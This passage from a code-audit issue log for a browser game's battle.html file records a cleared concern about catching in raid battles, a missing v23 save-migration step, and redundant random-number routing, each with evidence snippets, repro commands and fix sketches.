The raid never sets `wild:true`, never tags `safari`/`bossArc`, and never calls `enterCatchEncounter`. The trainer-battle screen exposes no ball/catch action — balls are thrown only via `window.StoryMode.catchThrow(k)` on the catch screen (`~50245`).

**Repro**: trace raid launch path (`~47214`→`~47239`→`launchBattle`); grep confirms `wild:true` sites are roaming/partner/safari/bossArc/wild only, none on the raid path.

**Blast radius**: None — this is a cleared concern. The no-catch lock is robust by codepath separation (raid = trainer battle), not by a suppressible UI flag. No fix needed.

**Fix sketch**: n/a (verified correct).

**Verification**: already verified by static trace; would only regress if a future raid path set `wild:true` or routed through `enterCatchEncounter`.

---

## <a id="ISSUE-440"></a> ISSUE-440: `SAVE_VER = 23` but migration dispatch stops at `_loadedVer < 22` — no numbered v23 step

---
id: ISSUE-440
severity: P4
category: dx
anchor_symbol: SAVE_VER
current_line_hint: ~34302
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1e345769ae23
confidence: high
status: open
---

**Title**: `SAVE_VER = 23` but migration dispatch stops at `_loadedVer < 22` — no numbered v23 step

**Evidence**:
```js
const SAVE_VER = 23;
...
if (_loadedVer < 22) { migrateStoryPreV22(); }
// no `if (_loadedVer < 23)` block
```
v22→v23 added `sm.wanderByEventIdx:{}` (Wander Around). It is covered by a generic back-fill (`~35364`: `if (!sm.wanderByEventIdx ...) sm.wanderByEventIdx = {}`) plus defensive consumer init (`~49359`), so round-trip is functionally safe.

**Repro**: `grep -nE "< 23|PreV23" battle.html` → none. Track round-trip via `migratePreV22` preserves explicit picks (probe: `preserved:true`).

**Blast radius**: No data loss today — the back-fill saves it. But the codebase's established pattern is one numbered `migrateStoryPreV<N>` per SAVE_VER bump; v23 broke that pattern, so a future field added under "v23" has no obvious migration home and could be missed. DX/consistency only.

**Fix sketch**: Add a no-op-or-backfill `if (_loadedVer < 23) { /* wanderByEventIdx back-fill */ }` to keep the chain contiguous, OR document that v23 deliberately uses the generic back-fill. Pasteur-owned (save schema).

**Verification**: migration chain has a contiguous step per version; v22 save loads with `sm.wanderByEventIdx` present.

---

## <a id="ISSUE-441"></a> ISSUE-441: Three redundant RNG-routing mechanisms; confusion self-hit relies solely on the global Math.random patch while siblings use storyAwareRng()

---
id: ISSUE-441
severity: P4
category: inconsistency
anchor_symbol: storyAwareRng
current_line_hint: ~26330
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 76b72a3f4763
confidence: high
status: open
---

**Title**: Three redundant RNG-routing mechanisms; confusion self-hit relies solely on the global Math.random patch while siblings use storyAwareRng()

**Evidence**:
```js
// confusion self-hit (26330): bare Math.random — covered ONLY by the global patch
else if (Math.random() < 0.3333) { ... }
// thaw (26301) and harvest (28604): use the helper
const _thawRng = storyAwareRng(); if (_thawRng() < 0.2) ...
```

**Repro**: `node scripts/debug/_repro/rng-override.mjs` proves the global `Math.random` override (~34948) routes ALL bare `Math.random()` to `storyRngNext` (byte-identical stream) whenever `sm.active && sm.runSeed != null`. So the prior audit's "bare Math.random drifts seeded replays" P1 is OBSOLETE — confusion/partial-trap/thaw/harvest/rival-intro are all deterministic in story runs. The remaining issue is purely maintainability: `storyRngNext` (direct), `storyAwareRng()` (helper), and the global monkeypatch all coexist, and the confusion site uses none of the explicit forms — a future refactor that narrows the global patch would silently desync confusion while thaw/harvest stay seeded.

**Blast radius**: Determinism is currently intact everywhere in story mode; this is a latent-fragility note, not a live bug. Outside story (`sm.active=false`) these sites are native-random by design (PvP/quick-play — out of scope).

**Fix sketch**: Pick ONE convention. Prefer routing every user-visible battle roll through `storyAwareRng()`/`storyRngNext` explicitly and treat the global `Math.random` patch as a belt-and-suspenders safety net, not the primary mechanism. Convert the confusion self-hit at ~26330 to `storyAwareRng()` for parity with thaw/harvest.

**Verification**: `grep -nE 'Math\.random\(\)' battle.html` inside battle-loop handlers should be ~0 for user-visible rolls; rng-override.mjs determinism still holds.

---
